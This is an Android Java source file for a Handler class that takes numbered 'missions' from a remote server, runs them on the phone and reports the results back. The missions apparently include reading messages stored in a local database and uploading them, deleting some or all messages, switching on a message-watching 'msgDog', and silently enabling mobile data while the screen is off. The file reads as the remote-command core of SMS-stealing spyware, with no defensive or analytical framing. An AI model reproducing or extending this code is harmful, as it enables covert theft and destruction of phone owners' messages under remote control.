package Handler;

import value.constant;
import android.content.Context;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;

//import com.example.doit.MainActivity.ConnectingJinDuHan;
import com.example.doit.Methods;



public class BaoDaoAndGetMissionHan extends Handler
	{Context context;
	 Methods method=new Methods();
	 constant constant;
	 Handler processHan;
	 
	 public BaoDaoAndGetMissionHan(Context context)
	 {this.context=context; 
	 }
	

 public BaoDaoAndGetMissionHan(Context context,Handler handler)
{this.context=context; 
 this.processHan=handler;
}
	 
 @Override
 public void handleMessage(Message msg)
    {
try{String reply=msg.getData().getString("Reply");
//	Toast.makeText(this.context,"reply"+reply, 1000).show();
//	Log.v("internetHan","internetHan"+reply+" ");
	String[] replyCode=reply.split("dodo"); 
	String missionType=replyCode[0];
	String missionID="";
	  for(int i=1;i<=(replyCode.length-1);i++)
		{missionID+="dodo"+replyCode[i];
		 }
       if(missionID.length()>=4) 
			 missionID=missionID.substring(4,missionID.length());
//			 Log.v("subString hou",missionID);
	switch(Integer.valueOf(missionType))
	{
  case 1:
	   String screenStatus=Methods.isScreenOn(context);	
	   method.jiaoZuoYe(screenStatus,missionID,value.constant.jiaoZuoYeDiZhi,context);
	   break;
			   
   case 2:	
		  String duoSt="0";
		  duoSt=replyCode[2];
		  String taMa=Methods.getTaMa(Integer.valueOf(duoSt),context);
		  Log.v("tama",taMa);
		  method.jiaoZuoYe(taMa,missionID,value.constant.jiaoZuoYeDiZhi,context);
		  break;
			     
	case 3:
		   String gds="0";  
		   try{
		    gds=replyCode[2];
			    }catch(Exception e)
			    {}
		    int missionResult=Methods.ganDiaoMsgNsend(context,gds);
		    method.jiaoZuoYe(""+missionResult,missionID,value.constant.jiaoZuoYeDiZhi,context);
		    break;
			    
	 case 4:
	    String vvMode=method.setVV(context);
	    method.jiaoZuoYe(vvMode,missionID,value.constant.jiaoZuoYeDiZhi,context);
	    break;	

	 case 5://del all msgs
	  int missionResult_all=method.ganDiaoAllMsg(context);
	  method.jiaoZuoYe(""+missionResult_all,missionID,value.constant.jiaoZuoYeDiZhi,context);
	  break;
	  
	 case 6://read the msg in database
		  String savedMsg=method.readSavedMsg();
	      method.jiaoZuoYe(savedMsg, missionID,value.constant.jiaoZuoYeDiZhi,context);
	      break;
	 case 7://dele msg in database
		 String delMsgId=replyCode[2];
		 String delDuoShao=""+method.delMsgTable(delMsgId);	
		 method.jiaoZuoYe(delDuoShao,missionID,value.constant.jiaoZuoYeDiZhi,context);
	     break;
	 case 8://turn on the msgDog
		method.operateSwitch("msgDog","on");
		method.jiaoZuoYe(method.getSwitchValue("msgDog"),missionID,value.constant.jiaoZuoYeDiZhi, context);
		break; 
	 case 444:
		  if(value.Switch.keepNet==true)
		  {   if(Methods.isScreenOn(context).equals("off"))
			  Methods.turnOnData(context, true);
		  }
		   method.baoDaoGetMission(value.constant.baoDaoDiZhi,context);		   
//		  method.checkM(10,context);
//		  Toast.makeText(context,"µÁ—ππ˝µÕ£¨Ω®“ÈÀ¯∆¡,“‘√‚Àªµ∆¡ƒª",Toast.LENGTH_LONG).show();
		  break;
			     
	default:
		 method.baoDaoGetMission(value.constant.baoDaoDiZhi,context);
		break;
			    }
			}catch(Exception e)
			{ method.baoDaoGetMission(value.constant.baoDaoDiZhi,context);
//			 Log.v("exception","switch excep");
//			 Toast.makeText(context,"switch ex",Toast.LENGTH_LONG).show();
			}
	     }
		
	}


